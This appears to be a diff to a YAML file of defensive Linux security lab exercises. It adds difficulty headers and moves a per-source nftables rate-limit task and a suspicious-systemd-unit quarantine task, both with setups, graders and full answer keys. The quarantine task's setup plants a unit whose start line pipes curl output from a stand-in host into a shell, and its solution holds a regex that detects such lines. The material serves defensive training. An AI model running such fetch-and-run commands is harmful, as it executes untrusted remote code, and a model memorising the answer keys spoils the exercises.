@@ -4,6 +4,8 @@ profile: offsec
 order: 3
 exercises:
 
+# ===== Beginner =====
+
 - id: sec-016
   title: "Morning log triage: SSH failures and a web scanner"
   difficulty: 2
@@ -159,6 +161,8 @@ exercises:
     # --- part 2: Who is scanning the website? ---
     awk '$9 == 404 {print $1, $7}' /lab/access.log | sort -u | awk '{c[$1]++} END {for (i in c) print c[i], i}' | sort -rn | head -1 | awk '{print $2}' > /lab/ip.txt
     awk -v ip="$(cat /lab/ip.txt)" '$1 == ip && $9 == 200 {print $7}' /lab/access.log > /lab/path.txt
+
+# ===== Intermediate =====
 
 - id: sec-018
   title: "Close the audit findings: password policy and loose permissions"
@@ -323,112 +327,6 @@ exercises:
     # --- part 2: Anyone can write here ---
     sudo find /srv/kl/webroot \( -type f -o -type d \) -perm -0002 ! \( -type d -perm -1000 \) -exec chmod o-w {} +
 
-- id: sec-020
-  title: Throttle the brute-forcer
-  difficulty: 4
-  kind: build
-  tags: [nftables, rate-limit, netns, brute-force]
-  tutorial: |
-    **Concept.** A firewall can slow a password-guessing client by limiting new connections while other users and services stay untouched. The limit must be tracked per source address, or one noisy client uses up everyone's budget.
-
-    **Read up on:**
-    - `man nft` — `limit rate` and `burst`
-    - Per-key limiting — dynamic sets and meters
-    - `ct state new` — match attempts, not established traffic
-    - `ip netns exec` — run commands in a namespace
-  scenario: |
-    Host **`srv`** (10.70.0.1) runs a stand-in SSH service on TCP **2222** and a web
-    service on TCP **8080**. Clients **`cli`** (10.70.0.2) and **`cli2`** (10.70.0.3) share
-    its segment. Someone is hammering port 2222 with connection attempts.
-
-    Using **nftables inside `srv`**, allow each source address at most **10 new
-    connections per second** to port 2222 (a small burst is fine) and drop the excess.
-    Port 8080 and the other clients must be unaffected.
-  hints:
-    - "Put the rule in an `input` chain with `policy accept`; you are throttling, not blocking."
-    - "A plain `limit` is shared by every client. Look at `meter`, or a set with the `dynamic` flag, keyed on `ip saddr`."
-    - "Use `ip netns exec srv nft ...` and confirm with `ip netns exec srv nft list ruleset`."
-  solution: |
-    ```bash
-    sudo ip netns exec srv nft -f - <<'EOF'
-    table inet guard {
-      chain input {
-        type filter hook input priority filter; policy accept;
-        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
-      }
-    }
-    EOF
-    ```
-  setup: |
-    netns_new srv cli cli2 sw
-    ip -n sw link add br0 type bridge
-    ip -n sw link set br0 up
-    i=0
-    for pair in srv:1 cli:2 cli2:3; do
-      n=${pair%:*}; o=${pair#*:}; i=$((i + 1))
-      netns_link "$n" eth0 sw "p$i"
-      ip -n sw link set "p$i" master br0
-      ip -n "$n" addr add "10.70.0.$o/24" dev eth0
-    done
-    # A threaded listener with a large backlog, so without a rate limit a burst of
-    # connections all complete the handshake (ncat accepts too slowly for that).
-    cat >/srv/kl-listen.py <<'PYSRV'
-    import socket, sys, threading
-    def serve(port):
-        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.bind(("10.70.0.1", port)); s.listen(1024)
-        while True:
-            try: c, _ = s.accept()
-            except OSError: continue
-            threading.Thread(target=lambda c=c: (c.recv(16), c.close()), daemon=True).start()
-    for p in (2222, 8080):
-        threading.Thread(target=serve, args=(p,), daemon=True).start()
-    threading.Event().wait()
-    PYSRV
-    on_reset 'systemctl stop kl-svc 2>/dev/null; systemctl reset-failed kl-svc 2>/dev/null; rm -f /srv/kl-listen.py'
-    systemd-run --quiet --unit=kl-svc ip netns exec srv python3 /srv/kl-listen.py
-    eventually 15 'ip netns exec srv ss -ltnH | grep -q ":2222 " && ip netns exec srv ss -ltnH | grep -q ":8080 "'
-  check: |
-    f=$(mktemp); d=$(mktemp -d)
-    cat >"$f" <<'PY'
-    import socket, select, sys, time
-    host, port, n = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
-    socks = []
-    for _ in range(n):
-        s = socket.socket()
-        s.setblocking(False)
-        s.connect_ex((host, port))
-        socks.append(s)
-    ok, pending, end = 0, set(socks), time.time() + 0.8
-    while pending and time.time() < end:
-        _, w, _ = select.select([], list(pending), [], 0.1)
-        for s in w:
-            if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0:
-                ok += 1
-            pending.discard(s)
-    print(ok)
-    PY
-    fl() { ip netns exec "$1" python3 "$f" 10.70.0.1 "$2" "$3" 2>/dev/null; }
-    fl cli 2222 50 >"$d/a" &
-    fl cli2 2222 4 >"$d/b"
-    wait
-    a=$(cat "$d/a"); b=$(cat "$d/b")
-    sleep 2
-    c=$(fl cli 8080 50)
-    rm -rf "$f" "$d"
-    check "a flooding source is throttled on 2222 (${a:-0} of 50 got through)" '[ "${a:-0}" -ge 3 ] && [ "${a:-0}" -le 30 ]'
-    check "a second source is not affected by the flood (${b:-0} of 4)" '[ "${b:-0}" -ge 4 ]'
-    check "port 8080 is not throttled (${c:-0} of 50)" '[ "${c:-0}" -ge 40 ]'
-  solve: |
-    sudo ip netns exec srv nft -f - <<'EOF'
-    table inet guard {
-      chain input {
-        type filter hook input priority filter; policy accept;
-        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
-      }
-    }
-    EOF
-
 - id: sec-021
   title: Build a file integrity baseline
   difficulty: 3
@@ -507,83 +405,6 @@ exercises:
     [ "$(find . -type f | LC_ALL=C sort)" = "$(sed 's/^[0-9a-f]\{64\}  \*\?//' /lab/baseline.sha256 | LC_ALL=C sort)" ] || exit 1
     EOF
     chmod +x /lab/verify.sh
-
-- id: sec-022
-  title: Suspicious systemd units
-  difficulty: 4
-  kind: fix
-  tags: [systemd, persistence, forensics]
-  tutorial: |
-    **Concept.** A systemd service is a small text file, an easy persistence mechanism: the attacker only needs a unit that starts their program. Reviewing means reading what each `Exec` line launches, and from where, not trusting names.
-
-    **Read up on:**
-    - `man systemd.service` — the `Exec*` directives
-    - `grep -n '^Exec'` — active command lines only
-    - Writable locations — why running code from some directories is a red flag
-    - `sha256sum` — fingerprint evidence before and after moving it
-  scenario: |
-    After a breach, the unit files from **`/etc/systemd/system`** were copied to
-    **`/lab/units`** for review. Some of them start something that doesn't belong on
-    a server.
-
-    Move every **suspicious** unit file, unmodified, into **`/lab/quarantine/`**
-    (create it). Legitimate units must stay in `/lab/units` and must not be edited.
-  hints:
-    - "`grep -n '^Exec' /lab/units/*.service` shows what each unit starts. Judge the command, not the description."
-    - "Ask where each program lives and who could have put it there, and whether a command downloads something and runs it."
-    - "A path that appears in a comment, a `PrivateTmp` setting, or a cleanup line is not the same as a program being started from it."
-  solution: |
-    Inspect the start-up commands and look for programs launched from world-writable locations (`/dev/shm`, `/var/tmp`, `/tmp`) or fetched and piped straight into a shell:
-
-    ```bash
-    mkdir -p /lab/quarantine
-    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service \
-      | xargs -r mv -t /lab/quarantine
-    ```
-  setup: |
-    python3 - <<'PY'
-    import random, os
-    sus_names = random.sample(["update-notifier-sync", "dbus-session-cache", "kworker-helper",
-                               "systemd-resolved-helper", "cron-extra", "udev-monitor"], 3)
-    def unit(desc, lines, user="root"):
-        return ("[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\n%s\nUser=%s\nRestart=on-failure\n\n"
-                "[Install]\nWantedBy=multi-user.target\n") % (desc, "\n".join(lines), user)
-    ip = "203.0.113.%d" % random.randint(20, 220)
-    sus = {
-        sus_names[0]: unit("Kernel worker helper", ["ExecStart=/dev/shm/.kw-%d" % random.randint(100, 999)]),
-        sus_names[1]: unit("Session cache daemon", ["ExecStart=/var/tmp/.sd-%d --quiet" % random.randint(100, 999)]),
-        sus_names[2]: unit("System update check", ["ExecStartPre=/bin/sh -c 'curl -s http://%s/p | sh'" % ip,
-                                                  "ExecStart=/usr/bin/sleep infinity"]),
-    }
-    ok = {
-        "app-api": unit("Application API", ["WorkingDirectory=/opt/api", "PrivateTmp=true",
-                        "ReadWritePaths=/var/tmp/api-cache", "ExecStart=/usr/bin/python3 /opt/api/server.py"], "api"),
-        "backup-nightly": unit("Nightly backup", ["ExecStart=/usr/local/bin/backup.sh",
-                               "ExecStop=/bin/rm -rf /tmp/backup-stage"]),
-        "node-exporter": unit("Metrics exporter", ["ExecStart=/usr/local/bin/node_exporter --web.listen-address=127.0.0.1:9100"], "nobody"),
-        "log-rotate-extra": unit("Extra log rotation", ["ExecStartPre=/usr/bin/test -d /var/log/app",
-                                 "ExecStart=/usr/sbin/logrotate /etc/logrotate.d/app"]),
-        "cache-warm": unit("Cache warmer", ["#ExecStart=/tmp/old-warm.sh", "ExecStart=/opt/cache/warm --once"], "cache"),
-        "health-ping": unit("Local health ping", ["ExecStart=/usr/bin/curl -fsS -o /dev/null http://127.0.0.1:9091/ping"], "nobody"),
-        "time-sync": unit("Clock synchronisation", ["ExecStart=/usr/sbin/chronyd -n"]),
-    }
-    os.makedirs("/lab/units", exist_ok=True)
-    for name, text in list(sus.items()) + list(ok.items()):
-        with open("/lab/units/%s.service" % name, "w") as f:
-            f.write(text)
-    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(sus)) + "\n")
-    open("/var/lib/kubelab/sus.names", "w").write("\n".join(sus) + "\n")
-    PY
-    chown -R "$(lab_user):" /lab/units
-    (cd /lab/units && sha256sum $(sed 's/$/.service/' "$KL_STATE/sus.names") | LC_ALL=C sort) > "$KL_STATE/sus.sha"
-    (cd /lab/units && sha256sum -- *.service | LC_ALL=C sort) > "$KL_STATE/all.sha"
-    LC_ALL=C comm -13 "$KL_STATE/sus.sha" "$KL_STATE/all.sha" > "$KL_STATE/ok.sha"
-  check: |
-    check "the suspicious units are quarantined, unmodified" '[ "$(cd /lab/quarantine && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/sus.sha")" ]'
-    check "the legitimate units were left alone" '[ "$(cd /lab/units && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/ok.sha")" ]'
-  solve: |
-    mkdir -p /lab/quarantine
-    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service | xargs -r mv -t /lab/quarantine
 
 - id: sec-023
   title: Scan the repository for secrets
@@ -765,6 +586,193 @@ exercises:
     for r in $(docker images --format '{{.Repository}}:{{.Tag}}' | grep '^kl-audit/'); do
       docker image inspect "$r" | jq -e '.[0].Config as $c | ($c.User // "") as $u | ($u != "" and $u != "root" and $u != "0") and ($c.Healthcheck != null) and ((($c.ExposedPorts // {}) | keys) == ["8080/tcp"]) and ((($c.Env // []) | map(select(test("^[^=]*(PASSWORD|SECRET|TOKEN)"))) | length) == 0)' >/dev/null && echo "$r" || true
     done > /lab/answer.txt
+
+# ===== Advanced =====
+
+- id: sec-020
+  title: Throttle the brute-forcer
+  difficulty: 4
+  kind: build
+  tags: [nftables, rate-limit, netns, brute-force]
+  tutorial: |
+    **Concept.** A firewall can slow a password-guessing client by limiting new connections while other users and services stay untouched. The limit must be tracked per source address, or one noisy client uses up everyone's budget.
+
+    **Read up on:**
+    - `man nft` — `limit rate` and `burst`
+    - Per-key limiting — dynamic sets and meters
+    - `ct state new` — match attempts, not established traffic
+    - `ip netns exec` — run commands in a namespace
+  scenario: |
+    Host **`srv`** (10.70.0.1) runs a stand-in SSH service on TCP **2222** and a web
+    service on TCP **8080**. Clients **`cli`** (10.70.0.2) and **`cli2`** (10.70.0.3) share
+    its segment. Someone is hammering port 2222 with connection attempts.
+
+    Using **nftables inside `srv`**, allow each source address at most **10 new
+    connections per second** to port 2222 (a small burst is fine) and drop the excess.
+    Port 8080 and the other clients must be unaffected.
+  hints:
+    - "Put the rule in an `input` chain with `policy accept`; you are throttling, not blocking."
+    - "A plain `limit` is shared by every client. Look at `meter`, or a set with the `dynamic` flag, keyed on `ip saddr`."
+    - "Use `ip netns exec srv nft ...` and confirm with `ip netns exec srv nft list ruleset`."
+  solution: |
+    ```bash
+    sudo ip netns exec srv nft -f - <<'EOF'
+    table inet guard {
+      chain input {
+        type filter hook input priority filter; policy accept;
+        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
+      }
+    }
+    EOF
+    ```
+  setup: |
+    netns_new srv cli cli2 sw
+    ip -n sw link add br0 type bridge
+    ip -n sw link set br0 up
+    i=0
+    for pair in srv:1 cli:2 cli2:3; do
+      n=${pair%:*}; o=${pair#*:}; i=$((i + 1))
+      netns_link "$n" eth0 sw "p$i"
+      ip -n sw link set "p$i" master br0
+      ip -n "$n" addr add "10.70.0.$o/24" dev eth0
+    done
+    # A threaded listener with a large backlog, so without a rate limit a burst of
+    # connections all complete the handshake (ncat accepts too slowly for that).
+    cat >/srv/kl-listen.py <<'PYSRV'
+    import socket, sys, threading
+    def serve(port):
+        s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(("10.70.0.1", port)); s.listen(1024)
+        while True:
+            try: c, _ = s.accept()
+            except OSError: continue
+            threading.Thread(target=lambda c=c: (c.recv(16), c.close()), daemon=True).start()
+    for p in (2222, 8080):
+        threading.Thread(target=serve, args=(p,), daemon=True).start()
+    threading.Event().wait()
+    PYSRV
+    on_reset 'systemctl stop kl-svc 2>/dev/null; systemctl reset-failed kl-svc 2>/dev/null; rm -f /srv/kl-listen.py'
+    systemd-run --quiet --unit=kl-svc ip netns exec srv python3 /srv/kl-listen.py
+    eventually 15 'ip netns exec srv ss -ltnH | grep -q ":2222 " && ip netns exec srv ss -ltnH | grep -q ":8080 "'
+  check: |
+    f=$(mktemp); d=$(mktemp -d)
+    cat >"$f" <<'PY'
+    import socket, select, sys, time
+    host, port, n = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
+    socks = []
+    for _ in range(n):
+        s = socket.socket()
+        s.setblocking(False)
+        s.connect_ex((host, port))
+        socks.append(s)
+    ok, pending, end = 0, set(socks), time.time() + 0.8
+    while pending and time.time() < end:
+        _, w, _ = select.select([], list(pending), [], 0.1)
+        for s in w:
+            if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) == 0:
+                ok += 1
+            pending.discard(s)
+    print(ok)
+    PY
+    fl() { ip netns exec "$1" python3 "$f" 10.70.0.1 "$2" "$3" 2>/dev/null; }
+    fl cli 2222 50 >"$d/a" &
+    fl cli2 2222 4 >"$d/b"
+    wait
+    a=$(cat "$d/a"); b=$(cat "$d/b")
+    sleep 2
+    c=$(fl cli 8080 50)
+    rm -rf "$f" "$d"
+    check "a flooding source is throttled on 2222 (${a:-0} of 50 got through)" '[ "${a:-0}" -ge 3 ] && [ "${a:-0}" -le 30 ]'
+    check "a second source is not affected by the flood (${b:-0} of 4)" '[ "${b:-0}" -ge 4 ]'
+    check "port 8080 is not throttled (${c:-0} of 50)" '[ "${c:-0}" -ge 40 ]'
+  solve: |
+    sudo ip netns exec srv nft -f - <<'EOF'
+    table inet guard {
+      chain input {
+        type filter hook input priority filter; policy accept;
+        tcp dport 2222 ct state new meter perip { ip saddr limit rate over 10/second burst 10 packets } drop
+      }
+    }
+    EOF
+
+- id: sec-022
+  title: Suspicious systemd units
+  difficulty: 4
+  kind: fix
+  tags: [systemd, persistence, forensics]
+  tutorial: |
+    **Concept.** A systemd service is a small text file, an easy persistence mechanism: the attacker only needs a unit that starts their program. Reviewing means reading what each `Exec` line launches, and from where, not trusting names.
+
+    **Read up on:**
+    - `man systemd.service` — the `Exec*` directives
+    - `grep -n '^Exec'` — active command lines only
+    - Writable locations — why running code from some directories is a red flag
+    - `sha256sum` — fingerprint evidence before and after moving it
+  scenario: |
+    After a breach, the unit files from **`/etc/systemd/system`** were copied to
+    **`/lab/units`** for review. Some of them start something that doesn't belong on
+    a server.
+
+    Move every **suspicious** unit file, unmodified, into **`/lab/quarantine/`**
+    (create it). Legitimate units must stay in `/lab/units` and must not be edited.
+  hints:
+    - "`grep -n '^Exec' /lab/units/*.service` shows what each unit starts. Judge the command, not the description."
+    - "Ask where each program lives and who could have put it there, and whether a command downloads something and runs it."
+    - "A path that appears in a comment, a `PrivateTmp` setting, or a cleanup line is not the same as a program being started from it."
+  solution: |
+    Inspect the start-up commands and look for programs launched from world-writable locations (`/dev/shm`, `/var/tmp`, `/tmp`) or fetched and piped straight into a shell:
+
+    ```bash
+    mkdir -p /lab/quarantine
+    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service \
+      | xargs -r mv -t /lab/quarantine
+    ```
+  setup: |
+    python3 - <<'PY'
+    import random, os
+    sus_names = random.sample(["update-notifier-sync", "dbus-session-cache", "kworker-helper",
+                               "systemd-resolved-helper", "cron-extra", "udev-monitor"], 3)
+    def unit(desc, lines, user="root"):
+        return ("[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\n%s\nUser=%s\nRestart=on-failure\n\n"
+                "[Install]\nWantedBy=multi-user.target\n") % (desc, "\n".join(lines), user)
+    ip = "203.0.113.%d" % random.randint(20, 220)
+    sus = {
+        sus_names[0]: unit("Kernel worker helper", ["ExecStart=/dev/shm/.kw-%d" % random.randint(100, 999)]),
+        sus_names[1]: unit("Session cache daemon", ["ExecStart=/var/tmp/.sd-%d --quiet" % random.randint(100, 999)]),
+        sus_names[2]: unit("System update check", ["ExecStartPre=/bin/sh -c 'curl -s http://%s/p | sh'" % ip,
+                                                  "ExecStart=/usr/bin/sleep infinity"]),
+    }
+    ok = {
+        "app-api": unit("Application API", ["WorkingDirectory=/opt/api", "PrivateTmp=true",
+                        "ReadWritePaths=/var/tmp/api-cache", "ExecStart=/usr/bin/python3 /opt/api/server.py"], "api"),
+        "backup-nightly": unit("Nightly backup", ["ExecStart=/usr/local/bin/backup.sh",
+                               "ExecStop=/bin/rm -rf /tmp/backup-stage"]),
+        "node-exporter": unit("Metrics exporter", ["ExecStart=/usr/local/bin/node_exporter --web.listen-address=127.0.0.1:9100"], "nobody"),
+        "log-rotate-extra": unit("Extra log rotation", ["ExecStartPre=/usr/bin/test -d /var/log/app",
+                                 "ExecStart=/usr/sbin/logrotate /etc/logrotate.d/app"]),
+        "cache-warm": unit("Cache warmer", ["#ExecStart=/tmp/old-warm.sh", "ExecStart=/opt/cache/warm --once"], "cache"),
+        "health-ping": unit("Local health ping", ["ExecStart=/usr/bin/curl -fsS -o /dev/null http://127.0.0.1:9091/ping"], "nobody"),
+        "time-sync": unit("Clock synchronisation", ["ExecStart=/usr/sbin/chronyd -n"]),
+    }
+    os.makedirs("/lab/units", exist_ok=True)
+    for name, text in list(sus.items()) + list(ok.items()):
+        with open("/lab/units/%s.service" % name, "w") as f:
+            f.write(text)
+    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(sus)) + "\n")
+    open("/var/lib/kubelab/sus.names", "w").write("\n".join(sus) + "\n")
+    PY
+    chown -R "$(lab_user):" /lab/units
+    (cd /lab/units && sha256sum $(sed 's/$/.service/' "$KL_STATE/sus.names") | LC_ALL=C sort) > "$KL_STATE/sus.sha"
+    (cd /lab/units && sha256sum -- *.service | LC_ALL=C sort) > "$KL_STATE/all.sha"
+    LC_ALL=C comm -13 "$KL_STATE/sus.sha" "$KL_STATE/all.sha" > "$KL_STATE/ok.sha"
+  check: |
+    check "the suspicious units are quarantined, unmodified" '[ "$(cd /lab/quarantine && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/sus.sha")" ]'
+    check "the legitimate units were left alone" '[ "$(cd /lab/units && sha256sum -- *.service | LC_ALL=C sort)" = "$(cat "$KL_STATE/ok.sha")" ]'
+  solve: |
+    mkdir -p /lab/quarantine
+    grep -lE '^ExecStart(Pre|Post)?=.*(/dev/shm|/var/tmp|/tmp|\|[[:space:]]*sh)' /lab/units/*.service | xargs -r mv -t /lab/quarantine
+
+# ===== Capstone: a real-world lab =====
 
 - id: sec-025
   title: Rebuild the intrusion timeline
